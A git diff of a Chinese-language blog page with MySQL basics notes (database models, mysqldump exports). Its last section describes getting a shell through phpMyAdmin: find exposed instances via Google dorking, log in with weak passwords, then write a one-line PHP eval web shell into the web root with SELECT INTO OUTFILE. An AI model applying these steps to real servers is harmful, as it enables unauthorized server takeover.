@@ -1,4 +1,138 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="xiaoli24680"><meta name="keywords" content="safe"><link rel="alternative" href="/atom.xml" title="xiaoli24680's Blog" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>MySQL数据库基础知识笔记 - xiaoli24680's Blog</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">xiaoli24680's Blog</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">目录</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2018-12-22T04:23:00.000Z">December 22, 2018</time><h1 class="post__title"><a href="/2018/12/22/mysql数据库基础知识笔记/">MySQL数据库基础知识笔记</a></h1><div class="post__main echo"><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>数据库即存储数据的仓库，是一个管理数据的软件</p>
+<!DOCTYPE html>
+<html>
+<!-- Head -->
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>MySQL数据库基础知识笔记 | xiaoli24680&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="数据库数据库即存储数据的仓库，是一个管理数据的软件 数据库模型 关系型数据库（也称结构化数据库） MySQL：轻量级开源数据库，适用于中小型企业，性能较好 MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台 Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑 DB2 ……   非关系型数据库（也称非结构化数据库） re">
+<meta name="keywords" content="mysql,笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL数据库基础知识笔记">
+<meta property="og:url" content="https://xiaoli24680.github.io/2018/12/22/mysql数据库基础知识笔记/index.html">
+<meta property="og:site_name" content="xiaoli24680&#39;s Blog">
+<meta property="og:description" content="数据库数据库即存储数据的仓库，是一个管理数据的软件 数据库模型 关系型数据库（也称结构化数据库） MySQL：轻量级开源数据库，适用于中小型企业，性能较好 MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台 Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑 DB2 ……   非关系型数据库（也称非结构化数据库） re">
+<meta property="og:locale" content="ZH-Hans">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/mysql-V01.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/create_db01.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/charset01.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/charset02.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/create_tb01.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/create_tb02.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/alter_tb01.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/desc01.png">
+<meta property="og:image" content="https://xiaoli24680.github.io/mysql/where01.png">
+<meta property="og:updated_time" content="2018-12-22T06:22:17.256Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL数据库基础知识笔记">
+<meta name="twitter:description" content="数据库数据库即存储数据的仓库，是一个管理数据的软件 数据库模型 关系型数据库（也称结构化数据库） MySQL：轻量级开源数据库，适用于中小型企业，性能较好 MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台 Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑 DB2 ……   非关系型数据库（也称非结构化数据库） re">
+<meta name="twitter:image" content="https://xiaoli24680.github.io/mysql/mysql-V01.png">
+<link rel="publisher" href="https://plus.google.com/114550357749490779368">
+  
+    <link rel="alternative" href="/atom.xml" title="xiaoli24680&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="https://s18.postimg.org/k7qcci1t5/s_icon.png">
+  
+  <!-- Compiled and minified CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/css/materialize.min.css">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel="stylesheet" href="https://opensource.keycdn.com/fontawesome/4.7.0/font-awesome.min.css" integrity="sha384-dNpIIXE8U05kAbPhy3G1cz+yZmTzA6CY8Vg/u2L9xRnHjJiAK76m2BIEaSEV+/aU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.15/css/share.min.css">
+    <style>
+        .hljs-line-numbers {
+            text-align: right;
+            border-right: 1px solid #ccc;
+            color: #999;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+    </style>
+    <!-- <link rel="stylesheet" href="/css/style.css"> -->
+    <!-- <link rel="stylesheet" href="/css/code.css"> -->
+    <link rel="stylesheet" href="/css/style.css?version=12-23-16-50" type="text/css">
+    <link rel="stylesheet" href="/css/code.css?version=12-23-16-50" type="text/css">
+
+</head>
+
+
+<body>
+
+<header>
+    <div class="navbar-fixed">
+        <nav class="blue darken-3 nav-extended">
+            <div class="nav-wrapper">
+                <a href="#" data-activates="mobile-demo" class="button-collapse"><i class="material-icons">menu</i></a>
+                <ul id="nav-mobile" class="hide-on-med-and-down">
+                    
+                        <li><a href="/" class="nav-logo">xiaoli24680's Blog</a></li>
+                    
+                    
+                    <li><a class="" href="/">Home</a></li>
+                    
+                    <li><a class="" href="/archives">Archives</a></li>
+                    
+                    <li><a class="" href="/categories">Categories</a></li>
+                    
+                    <li><a class="" href="/tags">Tags</a></li>
+                    
+                    <li><a class="" href="/links">Links</a></li>
+                    
+                    <li><a class="" href="/about">About</a></li>
+                    
+                </ul>
+            </div>
+        </nav>
+
+    </div>
+    <ul class="side-nav" id="mobile-demo">
+        
+        <li><a class="" href="/">Home</a></li>
+        
+        <li><a class="" href="/archives">Archives</a></li>
+        
+        <li><a class="" href="/categories">Categories</a></li>
+        
+        <li><a class="" href="/tags">Tags</a></li>
+        
+        <li><a class="" href="/links">Links</a></li>
+        
+        <li><a class="" href="/about">About</a></li>
+        
+    </ul>
+    <!--You have to move ul out to make sure this work in mobile environment-->
+</header>
+
+
+<div class="container">
+      <article class="article-full">
+
+    <!-- Title -->
+    <h2 class="blog-item-title">
+        <a href="/2018/12/22/mysql数据库基础知识笔记/">
+            MySQL数据库基础知识笔记
+        </a>
+    </h2>
+
+    <!-- Date and Author -->
+    <p class="blog-item-meta">
+        Published on 2018 Dec 22 12:23:00
+        
+    
+        <br>
+        Last Updated on 2018 Dec 22 14:22:17
+        
+    </p>
+
+
+    <!-- Content -->
+    <h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>数据库即存储数据的仓库，是一个管理数据的软件</p>
 <h5 id="数据库模型"><a href="#数据库模型" class="headerlink" title="数据库模型"></a>数据库模型</h5><ul>
 <li>关系型数据库（也称结构化数据库）<ul>
 <li>MySQL：轻量级开源数据库，适用于中小型企业，性能较好</li>
@@ -170,4 +304,87 @@
 <li>第二种方法</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db_name &gt; ./db_name.sql	在DOS命令下运行</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 表名 &gt; 导出的文件名</span><br></pre></td></tr></table></figure>
-<h2 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 首先通过google hacking找到phpmyadmin的网站</span><br><span class="line"></span><br><span class="line">2. 弱口令登录，SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;判断我们有没有权限去写木马文件</span><br><span class="line"></span><br><span class="line">3. 执行SQL语句，查看数据库所在位置：select @@basedir;</span><br><span class="line"></span><br><span class="line">4. 猜测根目录写入木马文件：`select  &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;G;//shell.php&apos;`：注意：写木马的路径，一般是`/var/www/html`</span><br></pre></td></tr></table></figure></div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/mysql-笔记/">mysql,笔记</a></li></ul></footer></article><div class="comments" id="lv-container" data-id="city" data-uid="your uid"><script>(function(d, s) {var j, e = d.getElementsByTagName(s)[0];if (typeof LivereTower === 'function') { return; } j = d.createElement(s);j.src = 'https://cdn-city.livere.com/js/embed.dist.js';j.async = true;e.parentNode.insertBefore(j, e);})(document, 'script');</script></div></main><footer class="foot"><div class="foot-copy">&copy; 2016-2018 xiaoli24680</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>
+<h2 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 首先通过google hacking找到phpmyadmin的网站</span><br><span class="line"></span><br><span class="line">2. 弱口令登录，SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;判断我们有没有权限去写木马文件</span><br><span class="line"></span><br><span class="line">3. 执行SQL语句，查看数据库所在位置：select @@basedir;</span><br><span class="line"></span><br><span class="line">4. 猜测根目录写入木马文件：`select  &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;G;//shell.php&apos;`：注意：写木马的路径，一般是`/var/www/html`</span><br></pre></td></tr></table></figure>
+
+    <hr>
+
+    
+        <div class="social-share" data-disabled="weibo,qzone,qq,tencent,douban,linkedin,diandian"></div>
+    
+
+    <div class="blog-post">
+
+    <!--[...]-->
+    
+    <!-- Comments -->
+</div>
+
+    <!-- Tags and Categories links -->
+
+
+</article>
+
+
+</div>
+
+
+<footer class="grey darken-3">
+    <div class="footer-link">
+        
+        <a href="https://github.com/xiaoli24680" target="_blank"><i class="fa fa-github fa-2x" aria-hidden="true"></i></a>
+        
+        
+        
+        
+        
+        <a href="https://plus.google.com/114550357749490779368" target="_blank"><i class="fa fa-google-plus-official fa-2x" aria-hidden="true"></i>
+        
+        
+        <a href="http://music.163.com/#/user/home?id=30744948" target="_blank"><i class="fa fa-music fa-2x" aria-hidden="true"></i></a>
+        
+        
+          <a href="/atom.xml" target="_blank" title="rss_feed"><i class="fa fa-rss fa-2x" aria-hidden="true"></i></a>
+        
+    </a></div>
+    <div class="footer-ps">
+        <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> -
+            &copy; 2018 <a href="https://github.com/xiaoli24680" target="_blank"> xiaoli24680</a> - Theme <a href="https://github.com/lazzzis/hexo-theme-mls" target="_blank">MLS</a>
+        </p>
+    </div>
+</footer>
+
+<!--Import jQuery before materialize.js-->
+<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
+<!-- Compiled and minified JavaScript -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/js/materialize.min.js"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.6.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.15/js/social-share.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+<script src="/js/addition.js"></script>
+<script src="/js/zooming.js"></script>
+<!-- Disqus Comments -->
+
+
+
+<script>
+    // https://github.com/srobbin/jquery-backstretch
+    $.backstretch("/css/images/background.jpg?version=12-23-16-50");
+
+    
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-87274131-1', 'auto');
+        ga('send', 'pageview');
+    
+
+</script>
+
+
+</body>
+
+</html>
